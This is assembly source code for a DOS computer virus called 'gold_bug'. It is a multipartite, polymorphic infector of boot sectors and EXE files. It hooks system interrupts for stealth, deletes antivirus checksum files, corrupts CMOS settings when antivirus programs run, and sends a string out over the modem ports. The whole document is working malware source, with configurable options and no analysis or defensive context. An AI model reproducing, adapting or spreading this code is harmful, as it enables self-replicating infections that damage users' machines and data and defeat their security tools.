cseg            segment para    public  'code'
gold_bug        proc    near
assume          cs:cseg

;-----------------------------------------------------------------------------

;designed by "Q" the misanthrope.

;-----------------------------------------------------------------------------

.186
TRUE            equ     001h
FALSE           equ     000h

;-----------------------------------------------------------------------------

;option                              bytes used and where

DELETE_SCANNERS equ     FALSE   ; -2 bytes  -2 in com_code
CHECK_FOR_8088  equ     TRUE    ;  4 bytes   4 in com_code
INFECT_RANDOM   equ     TRUE    ;  4 bytes   4 in com_code
CMOS_BOMB       equ     TRUE    ;  4 bytes   4 in com_code
DEFLECT_DELETE  equ     TRUE    ;  5 bytes   5 in com_code
READING_STEALTH equ     TRUE    ;  5 bytes   5 in com_code
SAME_FILE_DATE  equ     TRUE    ; 24 bytes  24 in com_code
DOUBLE_DECRYPT  equ     TRUE    ; 26 bytes  26 in com_code
EXECUTE_SPAWNED equ     TRUE    ; 35 bytes  32 in com_code  3 in boot_code
MODEM_CODE      equ     TRUE    ; 40 bytes  29 in com_code 11 in boot_code
ANTI_ANTIVIRUS  equ     TRUE    ; 46 bytes  35 in com_code 11 in boot_code
POLYMORPHIC     equ     TRUE    ; 90 bytes  74 in com_code 16 in boot_code
MULTIPARTITE    equ     TRUE    ;372 bytes 346 in com_code 26 in boot_code

;-----------------------------------------------------------------------------

;floppy boot infection

FLOPPY_1_2M     equ     001h
FLOPPY_760K     equ     000h
FLOPPY_TYPE     equ     FLOPPY_1_2M

;-----------------------------------------------------------------------------

IFE MULTIPARTITE
DELETE_SCANNERS equ     FALSE
CHECK_FOR_8088  equ     FALSE
INFECT_RANDOM   equ     FALSE
DEFLECT_DELETE  equ     FALSE
READING_STEALTH equ     FALSE
SAME_FILE_DATE  equ     FALSE
EXECUTE_SPAWNED equ     FALSE
POLYMORPHIC     equ     FALSE
ENDIF

;-----------------------------------------------------------------------------

SECTOR_SIZE     equ     00200h
RES_OFFSET      equ     0fb00h
COM_OFFSET      equ     00100h
RELATIVE_OFFSET equ     RES_OFFSET-COM_OFFSET
PART_OFFSET     equ     COM_OFFSET+SECTOR_SIZE
BOOT_OFFSET     equ     07c00h
RELATIVE_BOOT   equ     BOOT_OFFSET-PART_OFFSET
LOW_JMP_10      equ     0031ch
LOW_JMP_21      equ     00321h
SAVE_INT_CHAIN  equ     0032ch
SCRATCH_AREA    equ     08000h
HEADER_SEGMENT  equ     00034h
INT_21_IS_NOW   equ     0cch
BIOS_INT_13     equ     0c6h
NEW_INT_13_LOOP equ     0cdh
BOOT_SECTOR     equ     001h
DESCRIPTOR_OFF  equ     015h
IF FLOPPY_TYPE EQ FLOPPY_1_2M
DESCRIPTOR      equ     0f909h
OLD_BOOT_SECTOR equ     00eh
COM_CODE_SECTOR equ     00dh
ELSE
DESCRIPTOR      equ     0f905h
OLD_BOOT_SECTOR equ     005h
COM_CODE_SECTOR equ     004h
ENDIF
READ_ONLY       equ     001h
SYSTEM          equ     004h
DELTA_RI        equ     004h
DSR             equ     020h
CTS             equ     010h
CD              equ     080h
FAR_JUMP        equ     0eah
MIN_FILE_SIZE   equ     00500h
PSP_SIZE        equ     00100h
VIRGIN_INT_13_A equ     00806h
VIRGIN_INT_13_B equ     007b4h
VIRGIN_INT_2F   equ     00706h
FAR_JUMP_OFFSET equ     006h
SET_INT_OFFSET  equ     007h
CHANGE_SEG_OFF  equ     009h
VIDEO_MODE      equ     00449h
MONOCHROME      equ     007h
COLOR_VIDEO_MEM equ     0b000h
ADDR_MUL        equ     004h
SINGLE_BYTE_INT equ     003h
VIDEO_INT       equ     010h
VIDEO_INT_ADDR  equ     VIDEO_INT*ADDR_MUL
DISK_INT        equ     013h
DISK_INT_ADDR   equ     DISK_INT*ADDR_MUL
SERIAL_INT      equ     014h
DOS_INT         equ     021h
DOS_INT_ADDR    equ     DOS_INT*ADDR_MUL
MULTIPLEX_INT   equ     02fh
COMMAND_LINE    equ     080h
FIRST_FCB       equ     05ch
SECOND_FCB      equ     06ch
NULL            equ     00000h
GET_PORT_STATUS equ     00300h
WRITE_TO_PORT   equ     00100h
HD_0_HEAD_0     equ     00080h
READ_A_SECTOR   equ     00201h
WRITE_A_SECTOR  equ     00301h
GET             equ     000h
SET             equ     001h
DELETE_W_FCB    equ     01300h
DEFAULT_DRIVE   equ     000h
GET_DEFAULT_DR  equ     01900h
DOS_SET_INT     equ     02500h
FILE_DATE_TIME  equ     05700h
DENYNONE        equ     040h
OPEN_W_HANDLE   equ     03d00h
READ_W_HANDLE   equ     03f00h
WRITE_W_HANDLE  equ     04000h
CLOSE_HANDLE    equ     03e00h
UNLINK          equ     04100h
FILE_ATTRIBUTES equ     04300h
RESIZE_MEMORY   equ     04a00h
QUERY_FREE_HMA  equ     04a01h
ALLOCATE_HMA    equ     04a02h
EXEC_PROGRAM    equ     04b00h
GET_ERROR_LEVEL equ     04d00h
TERMINATE_W_ERR equ     04c00h
RENAME_A_FILE   equ     05600h
LSEEK_TO_END    equ     04202h
CREATE_NEW_FILE equ     05b00h
RESIDENT_LENGTH equ     068h
PARAMETER_TABLE equ     005f1h
MAX_PATH_LENGTH equ     00080h
EXE_HEADER_SIZE equ     020h
NEW_EXE_HEADER  equ     00040h
NEW_EXE_OFFSET  equ     018h
PKLITE_SIGN     equ     'KP'
PKLITE_OFFSET   equ     01eh
NO_OF_COM_PORTS equ     004h
WINDOWS_BEGIN   equ     01605h
WINDOWS_END     equ     01606h
ERROR_IN_EXE    equ     0000bh
IF POLYMORPHIC
FILE_SIGNATURE  equ     07081h
XOR_SWAP_OFFSET equ     byte ptr ((offset serial_number)-(offset com_code))+TWO_BYTES
FILE_LEN_OFFSET equ     byte ptr ((offset serial_number)-(offset com_code))+THREE_BYTES
FIRST_UNDO_OFF  equ     byte ptr ((offset first_jmp)-(offset com_code)+ONE_BYTE)
SECOND_UNDO_OFF equ     byte ptr ((offset second_jmp)-(offset com_code))
BL_BX_OFFSET    equ     byte ptr ((offset incbl_incbx)-(offset com_code))
ROTATED_OFFSET  equ     byte ptr ((offset rotated_code)-(offset com_code))
ELSE
FILE_SIGNATURE  equ     0070eh
ENDIF
IF MODEM_CODE
STRING_LENGTH   equ     byte ptr ((offset partition_sig)-(offset string))
ENDIF
IF EXECUTE_SPAWNED
EXEC_SUBTRACT   equ     byte ptr ((offset file_name)-(offset exec_table))
ENDIF
DH_OFFSET       equ     byte ptr ((offset dh_value)-(offset initialize_boot)+TWO_BYTES)
ONE_NIBBLE      equ     004h
ONE_BYTE        equ     001h
TWO_BYTES       equ     002h
THREE_BYTES     equ     003h
FOUR_BYTES      equ     004h
FIVE_BYTES      equ     005h
FIVE_BITS       equ     005h
EIGHT_BYTES     equ     008h
USING_HARD_DISK equ     080h
KEEP_CF_INTACT  equ     002h
CMOS_CRC_ERROR  equ     02eh
CMOS_PORT       equ     070h
REMOVE_NOP      equ     001h
CR              equ     00dh
LF              equ     00ah
INT3_INCBX      equ     043cch
INC_BL          equ     0c3feh
INCBX_INCBL_XOR equ     INT3_INCBX XOR INC_BL
JMP_NO_SIGN     equ     079h
JMP_NOT_ZERO    equ     075h
JNS_JNZ_XOR     equ     JMP_NO_SIGN XOR JMP_NOT_ZERO
CLI_PUSHCS      equ     00efah

;-----------------------------------------------------------------------------

video_seg       segment at 0c000h
		org     00000h
original_int_10 label   word
video_seg       ends

;-----------------------------------------------------------------------------

io_seg          segment at 00070h
		org     00893h
original_2f_jmp label   word
io_seg          ends

;-----------------------------------------------------------------------------

		org     COM_OFFSET
com_code:

;-----------------------------------------------------------------------------

		IF      POLYMORPHIC
first_decode    proc    near
serial_number:  xor     word ptr ds:[si+bx+FIRST_UNDO_OFF],MIN_FILE_SIZE
		org     $-REMOVE_NOP
		org     $-FIVE_BYTES
		jmp     load_it
		org     $+TWO_BYTES
rotated_code:   int     SINGLE_BYTE_INT
		into
		adc     al,0d4h
incbl_incbx:    inc     bl
first_jmp:      jnz     serial_number
		add     bx,si
		jns     serial_number
first_decode    endp

;-----------------------------------------------------------------------------

		IF      DOUBLE_DECRYPT
second_decode   proc    near
		push    si
get_next_byte:  lodsw
		add     bx,ax
		inc     bx
		xor     byte ptr ds:[si+SECOND_UNDO_OFF],bl
		org     $-REMOVE_NOP
		dec     si
second_jmp:     jns     get_next_byte
		pop     si
second_decode   endp
		ENDIF
		ENDIF

;-----------------------------------------------------------------------------

com_start       proc    near
		IF      MULTIPARTITE
		push    cs
		pop     es
		call    full_move_w_si
		mov     ds,cx
		cmp     cx,word ptr ds:[NEW_INT_13_LOOP*ADDR_MUL]
		jne     dont_set_int
		mov     di,VIRGIN_INT_13_B
		call    set_both_ints
		push    cs
		pop     es
		ENDIF
dont_set_int:   IF      CHECK_FOR_8088
		mov     cl,RESIDENT_LENGTH
		mov     al,high(RESIZE_MEMORY)
		shl     ax,cl
		mov     bx,cx
		int     DOS_INT
		ELSEIF  MULTIPARTITE
		mov     bx,RESIDENT_LENGTH
		mov     ah,high(RESIZE_MEMORY)
		int     DOS_INT
		ENDIF
		IF      EXECUTE_SPAWNED
		pusha
		call    from_com_code+RELATIVE_OFFSET
		popa
		push    cs
		pop     ds
		push    cs
		pop     es
		cmpsw
		mov     dx,si
		sub     si,EXEC_SUBTRACT
		org     $-REMOVE_NOP
		mov     bx,PARAMETER_TABLE
		mov     di,bx
		mov     ax,EXEC_PROGRAM
set_table:      scasw
		movsb
		scasb
		mov     word ptr ds:[di],ds
		je      set_table
		int     DOS_INT
		mov     ah,high(GET_ERROR_LEVEL)
		int     DOS_INT
		mov     ah,high(TERMINATE_W_ERR)
		ELSEIF  MULTIPARTITE
		call    from_com_code+RELATIVE_OFFSET
		mov     ax,TERMINATE_W_ERR
		ENDIF
		IF      MULTIPARTITE
		int     DOS_INT
		ELSE
		jmp     boot_load
		ENDIF
com_start       endp

;-----------------------------------------------------------------------------

interrupt_21    proc    far
		pushf
		pusha
		push    ds
		push    es
		mov     di,dx
		push    ds
		pop     es
		cld
		mov     cx,MAX_PATH_LENGTH
		IF      MULTIPARTITE
		mov     si,offset file_name+RELATIVE_OFFSET
		ENDIF
		IF      READING_STEALTH OR DEFLECT_DELETE
		mov     bx,ax
		ENDIF
		cmp     ax,EXEC_PROGRAM
		IF      READING_STEALTH
		je      start_process
		cmp     ah,high(OPEN_W_HANDLE)
		ENDIF
		IF      DEFLECT_DELETE
		je      start_process
		cmp     ah,high(UNLINK)
		ENDIF
		jne     a_return
start_process:  xor     ax,ax
copy_name:      IF      MULTIPARTITE
		mov     bl,byte ptr ds:[di]
		mov     byte ptr cs:[si],bl
		inc     si
		ENDIF
		scasb
		loopne  copy_name
		std
		scasw
		IF      MULTIPARTITE
		mov     byte ptr cs:[si-FIVE_BYTES],al
		ENDIF
		mov     al,'E'
		scasw
		jne     a_return
		mov     ah,'X'
		scasw
		jne     a_return
		IF      MULTIPARTITE
		push    ds
		ENDIF
		pusha
		call    open_close_file
		IF      SAME_FILE_DATE
		mov     word ptr cs:[new_time+ONE_BYTE+RELATIVE_OFFSET],cx
		mov     word ptr cs:[new_date+ONE_BYTE+RELATIVE_OFFSET],dx
		ENDIF
		or      si,si
		IF      MULTIPARTITE
		jnz     large_exe_file
		cmp     word ptr ds:[si],FILE_SIGNATURE
		je      our_kind
		IF      INFECT_RANDOM
		xor     di,bp
		jpo     our_kind
		ENDIF
		cmp     word ptr ds:[si+NEW_EXE_OFFSET],NEW_EXE_HEADER
		jb      test_if_open
		cmp     word ptr ds:[si+PKLITE_OFFSET],PKLITE_SIGN
		je      test_if_open
		ELSE
		jz      our_kind
		ENDIF
large_exe_file: popa
		IF      MULTIPARTITE
		pop     ds
		ENDIF
		IF      ANTI_ANTIVIRUS
		mov     al,'N'
		scasb
		ja      a_return
		mov     al,'A'
		scasb
		jne     a_return
		pop     es
		pop     ds
		popa
		IF      READING_STEALTH OR DEFLECT_DELETE
		cmp     ah,high(EXEC_PROGRAM)
		jne     opened_file
		ENDIF
		popf
		IF      CMOS_BOMB
		mov     al,CMOS_CRC_ERROR
		out     CMOS_PORT,ax
		ENDIF
		IF      DELETE_SCANNERS
		mov     ah,high(UNLINK)
		jmp     short old_int_10_21
		ELSE
		mov     al,ERROR_IN_EXE
		stc
		retf    KEEP_CF_INTACT
		ENDIF
		ELSE
		jmp     short a_return
		ENDIF
our_kind:       popa
		IF      MULTIPARTITE
		pop     ds
error_in_copy:  inc     di
		xchg    byte ptr ds:[di],ch
		mov     ax,OPEN_W_HANDLE+DENYNONE
		int     INT_21_IS_NOW
		xchg    ax,bx
		jnc     close_it
		mov     byte ptr ds:[di],ch
jmp_a_return:   jmp     short a_return
close_it:       call    force_close
		ENDIF
a_return:       pop     es
		pop     ds
		popa
opened_file:    popf
old_int_10_21:  jmp     far ptr original_int_10
		IF      MULTIPARTITE
test_if_open:   popa
		pop     ds
		IF      READING_STEALTH OR DEFLECT_DELETE
		cmp     bh,high(EXEC_PROGRAM)
		jne     error_in_copy
		ENDIF
drive_letter:   sub     al,USING_HARD_DISK
		jns     error_in_copy
		mov     ax,GET+FILE_ATTRIBUTES
		int     INT_21_IS_NOW
		mov     ah,high(RENAME_A_FILE)
		pusha
		mov     di,offset file_name+RELATIVE_OFFSET
		push    cs
		pop     es
		int     INT_21_IS_NOW
set_attribs:    popa
		int     INT_21_IS_NOW
		mov     ah,high(CREATE_NEW_FILE)
		int     INT_21_IS_NOW
		jc      error_in_copy
		xchg    ax,bx
		mov     ax,SET+FILE_ATTRIBUTES
		pusha
		push    ds
		push    cs
		pop     ds
		or      cl,SYSTEM
		mov     dx,offset file_name+RELATIVE_OFFSET
		int     INT_21_IS_NOW
		IF      ANTI_ANTIVIRUS
		mov     dx,offset fcb_name+RELATIVE_OFFSET
		mov     ah,high(DELETE_W_FCB)
		int     INT_21_IS_NOW
		ENDIF
		xor     di,di
		mov     ax,SCRATCH_AREA
		mov     es,ax
		mov     ds,ax
		call    full_move
		call    move_some_more
		IF      POLYMORPHIC
		xor     si,si
		mov     cx,word ptr ds:[si+FILE_LEN_OFFSET]
		org     $-REMOVE_NOP
		IF      DOUBLE_DECRYPT
		pusha
set_second:     add     al,byte ptr cs:[si+RES_OFFSET]
		inc     ax
		xor     byte ptr ds:[si+SECOND_UNDO_OFF+TWO_BYTES],al
		org     $-REMOVE_NOP
		inc     si
		loop    set_second
		popa
		ENDIF
		mov     ax,cx
		pusha
		xor     bx,bx
		mov     bl,byte ptr ds:[si+XOR_SWAP_OFFSET]
		org     $-REMOVE_NOP
set_first:      xor     word ptr ds:[bx],ax
		inc     bx
		loop    set_first
		popa
		ELSE
file_length:    mov     cx,NULL
		ENDIF
		mov     ah,high(WRITE_W_HANDLE)
		cwd
		int     INT_21_IS_NOW
		IF      SAME_FILE_DATE
		mov     ax,SET+FILE_DATE_TIME
new_time:       mov     cx,NULL
new_date:       mov     dx,NULL
		call    do_int21_close
		ELSE
		call    force_close
		ENDIF
		pop     ds
		jmp     short set_attribs
		ENDIF
interrupt_21    endp

;-----------------------------------------------------------------------------

open_close_file proc    near
		mov     ax,OPEN_W_HANDLE+DENYNONE
		xor     cx,cx
		int     INT_21_IS_NOW
		jc      more_returns
		xchg    ax,bx
		IF      MULTIPARTITE
		mov     dx,HEADER_SEGMENT
		mov     ds,dx
		ENDIF
		IF      MODEM_CODE
		IF      MULTIPARTITE
		mov     dl,NO_OF_COM_PORTS
		ELSE
		mov     dx,NO_OF_COM_PORTS
		ENDIF
scan_coms:      dec     dx
		js      no_more_coms
		mov     ax,GET_PORT_STATUS
		int     SERIAL_INT
		xor     al,DELTA_RI+CTS+DSR
		and     al,DELTA_RI+CTS+DSR+CD
		jnz     scan_coms
		mov     si,offset string+STRING_LENGTH-ONE_BYTE+RELATIVE_OFFSET
		mov     cl,STRING_LENGTH
output_data:    lods    byte ptr cs:[si]
		mov     ah,high(WRITE_TO_PORT)
		int     SERIAL_INT
		loop    output_data
		ENDIF
no_more_coms:   IF      MULTIPARTITE
		mov     cl,EXE_HEADER_SIZE
		mov     ah,high(READ_W_HANDLE)
		cwd
		int     INT_21_IS_NOW
		xor     cx,cx
		ELSE
		xor     dx,dx
		ENDIF
		mov     ax,LSEEK_TO_END
		int     INT_21_IS_NOW
		IF      MULTIPARTITE
		IF      POLYMORPHIC
		mov     word ptr cs:[FILE_LEN_OFFSET+RES_OFFSET],ax
		ELSE
		mov     word ptr cs:[file_length+ONE_BYTE+RELATIVE_OFFSET],ax
		ENDIF
		ENDIF
		inc     ah
		cmp     ax,MIN_FILE_SIZE+PSP_SIZE
		adc     dx,cx
		mov     si,dx
		IF      SAME_FILE_DATE
		mov     ax,GET+FILE_DATE_TIME
do_int21_close: int     INT_21_IS_NOW
		ENDIF
force_close:    mov     ah,high(CLOSE_HANDLE)
		int     INT_21_IS_NOW
more_returns:   ret
open_close_file endp

;-----------------------------------------------------------------------------

full_move_w_si  proc    near
		IF      POLYMORPHIC
swap_incbx_bl:  xor     word ptr ds:[si+BL_BX_OFFSET],INCBX_INCBL_XOR
		org     $-REMOVE_NOP
		xor     byte ptr ds:[si+BL_BX_OFFSET+TWO_BYTES],JNS_JNZ_XOR
		org     $-REMOVE_NOP
		ENDIF
		stc
full_move_w_di: mov     di,RES_OFFSET
full_move:      call    move_code
move_code:      jc      move_some_more
		mov     si,RES_OFFSET
		IF      POLYMORPHIC
		IF      CHECK_FOR_8088
		mov     cl,ONE_NIBBLE
		ror     word ptr cs:[si+ROTATED_OFFSET],cl
		org     $-REMOVE_NOP
		ELSE
		ror     word ptr cs:[si+ROTATED_OFFSET],ONE_NIBBLE
		org     $-REMOVE_NOP
		ENDIF
		ENDIF
move_some_more: mov     cx,SECTOR_SIZE
		pushf
		cld
		rep     movs byte ptr es:[di],cs:[si]
		popf
		stc
		ret
full_move_w_si  endp

;-----------------------------------------------------------------------------

		IF      ANTI_ANTIVIRUS
		org     PART_OFFSET-ONE_BYTE
fcb_name        db      DEFAULT_DRIVE
		ENDIF

;-----------------------------------------------------------------------------

		org     PART_OFFSET
boot_code:

;-----------------------------------------------------------------------------

initialize_boot proc    near
		IF      ANTI_ANTIVIRUS
		db      'CHKLIST????'
		cli
		push    cs
		mov     si,BOOT_OFFSET-SECTOR_SIZE
		pop     ss
		mov     sp,si
		sti
		push    cs
		org     PART_OFFSET+DESCRIPTOR_OFF
		db      high(DESCRIPTOR)
		pop     ds
		mov     cx,COM_CODE_SECTOR
		pushf
		push    cs
		push    BOOT_OFFSET
		mov     ax,READ_A_SECTOR
		ELSE
		cli
		push    cs
		mov     si,BOOT_OFFSET-SECTOR_SIZE
		pop     ss
		mov     sp,si
		sti
		pushf
		push    cs
		push    BOOT_OFFSET
		push    cs
		mov     cx,COM_CODE_SECTOR
		mov     ax,READ_A_SECTOR
		org     PART_OFFSET+DESCRIPTOR_OFF
		db      high(DESCRIPTOR)
		pop     ds
		ENDIF
		push    cs
		pop     es
dh_value:       mov     dx,NULL
		mov     bx,dx
		xor     dh,al
		shr     dx,1
		mov     dh,bh
		push    dx
		mov     bx,si
		push    ax
		int     DISK_INT
		pop     ax
		mov     di,VIDEO_INT_ADDR
		mov     bx,offset old_int_10_21-SET_INT_OFFSET+RELATIVE_BOOT+ONE_BYTE
		call    get_n_set_int+ONE_BYTE
		mov     bx,offset low_code-TWO_BYTES+RELATIVE_OFFSET
		cmp     dx,LOW_JMP_10
		je      try_this_out
		cmp     byte ptr ds:[VIDEO_MODE],MONOCHROME
		jae     try_this_out
		mov     di,DISK_INT_ADDR
		IF      MULTIPARTITE
		call    set_both_ints
		ELSE
		mov     bx,(NEW_INT_13_LOOP*ADDR_MUL)-SET_INT_OFFSET
		call    get_n_set_int+ONE_BYTE
		mov     bl,low(BIOS_INT_13*ADDR_MUL)-SET_INT_OFFSET
		call    set_interrupt
		ENDIF
		mov     ch,high(COLOR_VIDEO_MEM)
		mov     bx,offset high_code+RELATIVE_OFFSET
try_this_out:   push    cx
		push    bx
		mov     es,cx
		call    full_move_w_si
		retf
initialize_boot endp

;-----------------------------------------------------------------------------

high_code       proc    near
		mov     dx,offset int_10_start+RELATIVE_OFFSET
		mov     bx,LOW_JMP_10-FAR_JUMP_OFFSET
		call    set_int_10_21
		mov     bx,VIDEO_INT_ADDR-SET_INT_OFFSET
low_code:       mov     es,cx
		mov     cl,OLD_BOOT_SECTOR
		mov     dx,LOW_JMP_10
		call    set_interrupt
		mov     bx,BOOT_OFFSET
		pop     dx
		int     DISK_INT
		xor     dh,dh
		mov     cl,BOOT_SECTOR
		mov     ax,WRITE_A_SECTOR
high_code       endp

;-----------------------------------------------------------------------------

interrupt_13    proc    far
int_13_start:   IF      MULTIPARTITE
		mov     byte ptr cs:[drive_letter+ONE_BYTE+RELATIVE_OFFSET],dl
		ENDIF
		cmp     cx,BOOT_SECTOR
		jne     no_boot_sector
		cmp     ah,high(READ_A_SECTOR)
		jne     no_boot_sector
		cmp     dx,HD_0_HEAD_0
		jbe     reread_boot
no_boot_sector: int     NEW_INT_13_LOOP
		jmp     short return_far
reread_boot:    int     NEW_INT_13_LOOP
		jc      return_far
		pusha
		push    ds
		push    es
		pop     ds
check_old_boot: mov     ax,READ_A_SECTOR
		xor     dh,dh
		mov     cl,OLD_BOOT_SECTOR
		IF      ANTI_ANTIVIRUS
		cmp     word ptr ds:[bx],'HC'
		ELSE
		cmp     word ptr ds:[bx],CLI_PUSHCS
		ENDIF
		je      read_old_boot
		test    dl,USING_HARD_DISK
		jnz     encode_hd
		cmp     word ptr ds:[bx+DESCRIPTOR_OFF-ONE_BYTE],DESCRIPTOR
		jne     time_to_leave
		mov     dh,al
		pusha
		int     NEW_INT_13_LOOP
		cmp     byte ptr ds:[bx],ch
		popa
		pushf
		pusha
		xor     dh,dh
		mov     cl,al
		int     NEW_INT_13_LOOP
		popa
		popf
		jne     time_to_leave
encode_hd:      mov     ah,high(WRITE_A_SECTOR)
		push    ax
		int     NEW_INT_13_LOOP
		pop     ax
		jc      time_to_leave
		mov     di,bx
		call    move_code
		mov     cl,COM_CODE_SECTOR
		IF      POLYMORPHIC
		xor     byte ptr ds:[bx+XOR_SWAP_OFFSET],dh
		org     $-REMOVE_NOP
		jo      dont_flip_it
		xchg    word ptr ds:[bx+ROTATED_OFFSET],ax
		org     $-REMOVE_NOP
		xchg    ah,al
		xchg    word ptr ds:[bx+ROTATED_OFFSET+TWO_BYTES],ax
		org     $-REMOVE_NOP
		xchg    word ptr ds:[bx+ROTATED_OFFSET],ax
		org     $-REMOVE_NOP
		ENDIF
dont_flip_it:   pusha
		int     NEW_INT_13_LOOP
		popa
		mov     di,bx
		call    move_some_more
		mov     byte ptr ds:[bx+DH_OFFSET],dh
		org     $-REMOVE_NOP
		mov     dh,cl
		inc     cx
		int     NEW_INT_13_LOOP
		jmp     short check_old_boot
read_old_boot:  mov     dh,byte ptr ds:[bx+DH_OFFSET]
		org     $-REMOVE_NOP
		int     NEW_INT_13_LOOP
time_to_leave:  pop     ds
		popa
		clc
return_far:     retf    KEEP_CF_INTACT
interrupt_13    endp

;-----------------------------------------------------------------------------

interrupt_2f    proc    far
		pusha
		push    ds
		push    es
		push    offset return_to_2f+RELATIVE_OFFSET
		xor     cx,cx
		mov     ds,cx
		mov     bx,SAVE_INT_CHAIN-SET_INT_OFFSET
		cmp     ax,WINDOWS_END
		jne     try_another
		les     dx,dword ptr ds:[bx+SET_INT_OFFSET]
		jmp     short set_13_chain
try_another:    cmp     ax,WINDOWS_BEGIN
		jne     another_return
		mov     di,VIRGIN_INT_13_B
		call    get_n_set_int+ONE_BYTE
		les     dx,dword ptr ds:[BIOS_INT_13*ADDR_MUL]
set_13_chain:   mov     ax,READ_A_SECTOR
		call    get_set_part
		mov     bx,VIRGIN_INT_13_B-SET_INT_OFFSET
		call    set_interrupt
		mov     bl,low(VIRGIN_INT_13_A-SET_INT_OFFSET)
		call    set_interrupt
		mov     ah,high(WRITE_A_SECTOR)
interrupt_2f    endp

;-----------------------------------------------------------------------------

get_set_part    proc    near
		pusha
		push    es
		mov     bx,SCRATCH_AREA
		mov     es,bx
		mov     dx,HD_0_HEAD_0
		inc     cx
		int     NEW_INT_13_LOOP
		mov     ax,READ_A_SECTOR
		int     DISK_INT
		pop     es
		popa
another_return: ret
get_set_part    endp

;-----------------------------------------------------------------------------

return_to_2f    proc    near
		pop     es
		pop     ds
		popa
		jmp     far ptr original_2f_jmp
return_to_2f    endp

;-----------------------------------------------------------------------------

interrupt_10    proc    far
int_10_start:   pushf
		pusha
		push    ds
		push    es
		push    offset a_return+RELATIVE_OFFSET
from_com_code:  xor     bx,bx
		mov     ds,bx
		or      ah,ah
		jz      set_10_back
		mov     ax,QUERY_FREE_HMA
		int     MULTIPLEX_INT
		cmp     bh,high(MIN_FILE_SIZE+SECTOR_SIZE)
		jb      another_return
		mov     ax,ALLOCATE_HMA
		int     MULTIPLEX_INT
		clc
		call    full_move_w_di
		mov     dx,offset int_13_start+RELATIVE_OFFSET
		call    set_13_chain
		mov     bx,VIRGIN_INT_2F-SET_INT_OFFSET
		mov     dx,offset interrupt_2f+RELATIVE_OFFSET
		call    set_interrupt
		cmp     word ptr ds:[LOW_JMP_10],cx
		je      set_10_back
		push    es
		push    es
		mov     di,DOS_INT_ADDR
		mov     bx,INT_21_IS_NOW*ADDR_MUL-SET_INT_OFFSET
		call    get_n_set_int+ONE_BYTE
		pop     ds
		mov     bx,offset old_int_10_21-SET_INT_OFFSET+RELATIVE_OFFSET+ONE_BYTE
		call    set_interrupt
		mov     ds,cx
		mov     ax,DOS_SET_INT+DOS_INT
		mov     dx,LOW_JMP_21
		int     INT_21_IS_NOW
		pop     es
		mov     bx,dx
		mov     dx,offset interrupt_21+RELATIVE_OFFSET
		mov     word ptr ds:[bx],0b450h
		mov     word ptr ds:[bx+TWO_BYTES],0cd19h
		mov     word ptr ds:[bx+FOUR_BYTES],05800h+INT_21_IS_NOW
		call    set_int_10_21
set_10_back:    mov     di,offset old_int_10_21+RELATIVE_OFFSET+ONE_BYTE
		mov     bx,LOW_JMP_10-FAR_JUMP_OFFSET
interrupt_10    endp

;-----------------------------------------------------------------------------

get_n_set_int   proc    near
		les     dx,dword ptr cs:[di]
		jmp     short set_interrupt
set_int_10_21:  mov     byte ptr ds:[bx+FAR_JUMP_OFFSET],FAR_JUMP
set_interrupt:  mov     word ptr ds:[bx+SET_INT_OFFSET],dx
		mov     word ptr ds:[bx+CHANGE_SEG_OFF],es
		ret
get_n_set_int   endp

;-----------------------------------------------------------------------------

		IF      MULTIPARTITE
set_both_ints   proc    near
		mov     bx,(NEW_INT_13_LOOP*ADDR_MUL)-SET_INT_OFFSET
		call    get_n_set_int+ONE_BYTE
		mov     bl,low(BIOS_INT_13*ADDR_MUL)-SET_INT_OFFSET
		jmp     short set_interrupt
set_both_ints   endp
		ENDIF

;-----------------------------------------------------------------------------

		IF      EXECUTE_SPAWNED
exec_table      db      COMMAND_LINE,FIRST_FCB,SECOND_FCB
		ENDIF

;-----------------------------------------------------------------------------

		IF      MODEM_CODE
		org     PART_OFFSET+001f3h
string          db      CR,'1O7=0SLMTA'
		ENDIF

;-----------------------------------------------------------------------------

		org     PART_OFFSET+SECTOR_SIZE-TWO_BYTES
partition_sig   dw      0aa55h

;-----------------------------------------------------------------------------

		org     PART_OFFSET+SECTOR_SIZE+TWO_BYTES
file_name       db      'DA',027h,'BOYS.COM',NULL

;-----------------------------------------------------------------------------

		org     PARAMETER_TABLE
		dw      NULL,NULL,NULL,NULL,NULL,NULL,NULL
		db      NULL

;-----------------------------------------------------------------------------

		IFE     MULTIPARTITE
boot_load       proc    near
		push    cs
		pop     es
		call    full_move_w_si
		mov     ds,cx
		cmp     cx,word ptr ds:[NEW_INT_13_LOOP*ADDR_MUL]
		jne     dont_set_intcd
		lds     dx,dword ptr ds:[VIRGIN_INT_13_B]
		mov     ax,DOS_SET_INT+NEW_INT_13_LOOP
		int     DOS_INT
dont_set_intcd: mov     ah,high(GET_DEFAULT_DR)
		int     DOS_INT
		call    from_com_code+RELATIVE_OFFSET
		mov     ax,TERMINATE_W_ERR
		int     DOS_INT
boot_load       endp
		ENDIF

;-----------------------------------------------------------------------------

		IF      POLYMORPHIC
load_it         proc    near
		mov     word ptr ds:[si],FILE_SIGNATURE
		mov     byte ptr ds:[si+TWO_BYTES],FIRST_UNDO_OFF
		push    bx
		xor     ax,ax
		cli
		out     043h,al
		in      al,040h
		mov     ah,al
		in      al,040h
		sti
		push    ax
		and     ax,0001eh
		mov     bx,ax
		mov     ax,word ptr ds:[bx+two_byte_table]
		mov     word ptr ds:[si+ROTATED_OFFSET+TWO_BYTES],ax
		org     $-REMOVE_NOP
		pop     ax
		and     ax,003e0h
		mov     cl,FIVE_BITS
		shr     ax,cl
		mov     bx,ax
		mov     al,byte ptr ds:[bx+one_byte_table]
		xor     al,low(INC_BL)
		mov     byte ptr ds:[swap_incbx_bl+THREE_BYTES],al
		pop     bx
		jmp     com_start
load_it         endp

;-----------------------------------------------------------------------------

two_byte_table: mov     al,0b2h
		xor     al,0b4h
		and     al,0d4h
		les     ax,dword ptr ds:[si]
		les     cx,dword ptr ds:[si]
		les     bp,dword ptr ds:[si]
		adc     al,0d4h
		and     al,084h
		adc     al,084h
		adc     al,024h
		add     al,084h
		add     al,014h
		add     al,024h
		test    dl,ah
		repz    stc
		repnz   stc

;-----------------------------------------------------------------------------

one_byte_table: int     SINGLE_BYTE_INT
		into
		daa
		das
		aaa
		aas
		inc     ax
		inc     cx
		inc     dx
		inc     bp
		inc     di
		dec     ax
		dec     cx
		dec     dx
		dec     bp
		dec     di
		nop
		xchg    ax,cx
		xchg    ax,dx
		xchg    ax,bp
		xchg    ax,di
		cbw
		cwd
		lahf
		scasb
		scasw
		xlat
		repnz
		repz
		cmc
		clc
		stc
		ENDIF

;-----------------------------------------------------------------------------
